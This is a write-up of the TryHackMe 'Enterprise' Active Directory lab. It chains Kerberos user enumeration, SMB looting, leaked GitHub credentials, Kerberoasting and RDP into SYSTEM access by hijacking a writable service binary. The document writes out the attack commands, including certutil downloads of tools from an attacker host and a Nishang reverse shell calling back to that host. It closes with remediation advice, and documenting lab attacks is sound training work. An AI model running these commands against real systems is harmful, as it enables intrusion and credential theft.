# Write-up: Enterprise lab on THM

This document is a structured security write-up based on hands-on exploitation of the Enterprise lab on TryHackMe website: https://tryhackme.com/room/enterprise

**Date**: January 12, 2026  
**Source**: TryHackMe — Enterprise & Personal Study Notes

---

## Research Overview

This lab demonstrates a realistic Active Directory compromise driven not by a single critical exploit, but by operational security failures, credential exposure, Kerberos abuse, and a classic misconfigured Windows service running as SYSTEM.

**The compromise highlights**:
* Credential leaks via public GitHub repositories.
* Residual sensitive data inside SMB shares.
* Kerberoasting leading to RDP access.
* Privilege escalation via a writable SYSTEM service binary.
* No "magic exploit" — just layered mistakes compounding into full domain compromise.

---

## Environment Identification & Reconnaissance
### 1. Network Scanning (Nmap)

We start, as usual, with a full TCP port scan:  
```bash
$ sudo nmap -sC -sV -v -Pn -p- 10.82.128.93
```

Nmap returns a full service map for the provided IP:  
```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
7990/tcp  open  http          Microsoft IIS httpd 10.0
9389/tcp  open  mc-nmf        .NET Message Framing
```

*This host is clearly a Domain Controller.*

---

### 2. Domain Identification

The most important discovery at this stage is the domain name:  
```text
LAB.ENTERPRISE.THM
```

This becomes the backbone for all further Kerberos-based attacks.

---

## Domain Enumeration & Initial Access
### 3. User Enumeration via Kerberos (AS-REQ)

We enumerate valid domain users via Kerberos (port 88):  
```bash
$ ./kerbrute_linux_amd64 userenum -d LAB.ENTERPRISE.THM --dc 10.82.128.93 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Valid users discovered:  
```text
banana@LAB.ENTERPRISE.THM
guest@LAB.ENTERPRISE.THM
administrator@LAB.ENTERPRISE.THM
cake@LAB.ENTERPRISE.THM
enterprise@LAB.ENTERPRISE.THM
nik@LAB.ENTERPRISE.THM
spooks@LAB.ENTERPRISE.THM
joiner@LAB.ENTERPRISE.THM
```

---

### 4. AS-REP Roasting Check

We check whether any users have Kerberos pre-authentication disabled:  
```bash
$ impacket-GetNPUsers LAB.ENTERPRISE.THM/ -usersfile users2.txt -format hashcat -outputfile hashes88.txt -dc-ip 10.82.128.93 -no-pass
```

Result:  
* No users returned hashes

No AS-REP roastable accounts found.

---

## Web Surface Enumeration (Dead End)
### 5. HTTP Fuzzing (Port 80)

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u "http://10.82.128.93/FUZZ" -ic -c -e .txt,.php,.html
```

Only robots.txt exists:  
```text
Why would robots.txt exist on a Domain Controllers web server?
Robots.txt is for search engines, not for you!
```

---

6. HTTP Fuzzing (Port 7990)

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u "http://10.82.128.93:7990/FUZZ" -ic -c -e .txt,.php,.html
```

No useful endpoints discovered.

At this point, HTTP is not our entry point.

---

## SMB Enumeration & Credential Discovery
### 7. SMB Share Enumeration

```bash
$ smbclient -L //10.82.128.93 -N
```

Interesting shares:  
* Docs
* Users — "Users Share. Do Not Touch!"

---

### 8. Sensitive Documents in Docs Share

Files discovered:  
* RSA-Secured-Credentials.xlsx
* RSA-Secured-Document-PII.docx

Both are password-protected.

Attempted cracking:  
```bash
$ office2john RSA-Secured-Document-PII.docx > hash1.txt
```

```bash
$ office2john RSA-Secured-Credentials.xlsx > hash2.txt
```

```bash
$ hashcat -m 9600 hash1.txt /usr/share/eaphammer/wordlists/rockyou.txt --force
```

```bash
$ hashcat -m 9600 hash2.txt /usr/share/eaphammer/wordlists/rockyou.txt --force
```

After ~15 minutes at ~5000 H/s:  
* No passwords recovered

*This path is abandoned.*

---

### 9. Full Offline Looting of Users Share

```bash
$ smbclient //10.82.128.93/Users -N -c "prompt OFF; recurse ON; mget *"
```

Folders of interest:  
* LAB-ADMIN
* Default

---

### 10. PowerShell History Credential Leak

Inside:  
* LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

Credentials found:  
* replication:101RepAdmin123!!

Validation attempt:  
```bash
$ nxc smb 10.82.128.93 -u 'replication' -p '101RepAdmin123!!'
```

Result:  
* Access denied

*Credentials are stale.*

## External Credential Exposure (GitHub)
### 11. GitHub Credential Leak

The web application on port 7990 references a GitHub repository related to the lab.

Inside that repository:  
```text
userName = 'nik'
userPassword = 'ToastyBoi!'
```

Validation:  
```bash
$ nxc smb 10.82.128.93 -u 'nik' -p 'ToastyBoi!'
```

*Success.*

*First valid domain credentials obtained.*

---

### 12. Additional Credential Easter Egg
```text
contractor-temp               Change password from Password123!
```

Validation:  
```bash
$ nxc smb 10.82.128.93 -u 'contractor-temp' -p 'Password123!'
```

*Success.*

Current credentials:  
```text
nik:ToastyBoi!
contractor-temp:Password123!
```

---

## Kerberoasting & Lateral Movement
### 13. Kerberoasting with nik
```bash
$ impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip 10.82.128.93 -request
```

TGS hash captured for user bitbucket.

Cracked credentials:  
```text
bitbucket:littleredbucket
```

Validation:  
```bash
$ nxc smb 10.82.128.93 -u 'bitbucket' -p 'littleredbucket'
```

*Success.*

---

## RDP Access & User Flag
### 14. RDP Authentication
```bash
$ nxc rdp 10.82.128.93 -u bitbucket -p littleredbucket
```

*(Pwn3d!)*

Connect:  
```bash
$ xfreerdp3 /u:bitbucket /p:littleredbucket /v:10.82.128.93 /cert:ignore +clipboard /dynamic-resolution
```

User flag found on Desktop:  
```text
THM{ed882d02b34246536ef7da79062bef36}
```

---

## Privilege Escalation — SYSTEM
### 15. Local Enumeration

PowerView:  
```powershell
> certutil -urlcache -split -f http://192.168.144.226/PowerView.ps1 pv.ps1
```

BloodHound collection:  
```powershell
> certutil -urlcache -split -f http://192.168.144.226/SharpHound.ps1 shrphd.ps1
```

```powershell
> Invoke-BloodHound -CollectionMethod All -Domain LAB.ENTERPRISE.THM -ZipFileName loot.zip
```

*Analysis shows no obvious AD attack paths.*

---

### 16. winPEAS Discovery

```powershell
> powershell -ep bypass
```

```powershell
> powershell .\winPEAS.ps1
```

Critical finding:  
* Service: ZeroTierOneService
* Runs as: NT AUTHORITY\SYSTEM
* Writable binary path

Binary path:  
```text
C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
```

---

### 17. Service Binary Hijacking

Gonna use Nishang reverse shell (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Payload:  
```text
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.144.226 -Port 4444
```

Converted (https://ps2exe.azurewebsites.net, do not use online converters in a real production) to executable (zro.exe) and uploaded:  
```powershell
> certutil -urlcache -split -f http://192.168.144.226/zro.exe zro.exe
```

Binary replaced, service started:  
```powershell
net start zerotieroneservice
```

Reverse shell received:  
```text
PS C:\Windows\system32> whoami
nt authority\system
```

---

### 18. System Flag

```text
THM{1a1fa94875421296331f145971ca4881}
```

*Full domain compromise achieved.*

---

## Security Failures & Vulnerability Classification
Issue	Classification:  
* Credentials exposed on GitHub	No CVE — Credential Exposure / OPSEC Failure
* Sensitive files readable via SMB No CVE — Misconfiguration (CWE-522)
* Kerberoastable SPN (bitbucket) No CVE — Kerberos Design Abuse
* Writable SYSTEM service binary (ZeroTier)	No CVE — Windows Service Misconfiguration (CWE-284)

---

## Remediation Recommendations
* Enforce strict policies against publishing credentials online.
* Audit all SMB shares for sensitive data.
* Prohibit credential storage in plaintext (files, scripts, history).
* Rotate all compromised passwords and enforce long, complex passwords or migrate to gMSA.
* Apply Principle of Least Privilege to all service accounts and binaries — no writable SYSTEM services, ever.

---

## Conclusion

This lab perfectly illustrates how small operational mistakes, when chained together, can lead to full Active Directory takeover — even without exploiting a single critical CVE.

* No zero-days.
* No magic exploits.
* Just discipline failures.

---

*Write-up compiled based on TryHackMe Enterprise (https://tryhackme.com/room/enterprise) lab.*
